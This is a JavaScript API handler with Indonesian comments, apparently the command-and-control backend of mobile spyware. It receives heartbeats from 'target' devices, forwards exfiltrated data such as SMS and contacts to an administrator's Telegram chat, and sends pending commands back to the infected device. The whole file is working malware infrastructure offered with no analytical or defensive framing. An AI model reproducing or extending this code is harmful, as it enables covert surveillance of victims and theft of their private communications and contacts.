/**
 * FILE: api/status.js
 * Endpoint POST untuk heartbeat dan exfiltrasi data ringan dari target.
 */

import { getTarget, updateTarget, getPendingCommand } from '../lib/database.js';
import { hash } from '../lib/crypto.js';
import { sendMessage } from '../lib/telegramBot.js';
import config from '../lib/config.js';

export default async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  
  try {
    const { deviceId, status, battery, currentApp, data } = req.body;
    if (!deviceId) return res.status(400).json({ success: false, error: 'Missing Device ID' });
    
    const deviceHash = hash(deviceId);
    const target = await getTarget(deviceHash);
    
    if (!target) return res.status(404).json({ success: false, error: 'Target Not Found' });
    
    // Update status di database
    await updateTarget(deviceHash, { 
      lastSeen: Date.now(), 
      battery: battery || target.battery,
      status: status || target.status,
      currentApp: currentApp || target.currentApp
    });
    
    // Jika ada data exfiltrasi (SMS, Kontak, dll), kirim ke Telegram
    if (data && Object.keys(data).length > 0) {
      const msg = `📤 *Exfiltrated Data from ${target.deviceInfo.model}*
ID: \`${deviceHash}\`
Data Type: ${data.type || 'Unknown'}
Content: \`\`\`json\n${JSON.stringify(data.content, null, 2)}\n\`\`\``;
      
      await sendMessage(config.telegram.adminChatId, msg);
    }
    
    // Cek apakah ada command yang pending untuk dikirim balik
    const pendingCmd = await getPendingCommand(deviceHash);
    
    res.status(200).json({ 
      success: true, 
      next_command: pendingCmd ? pendingCmd.command : null,
      command_id: pendingCmd ? pendingCmd.id : null
    });
    
  } catch (err) {
    console.error('Status Error:', err.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};
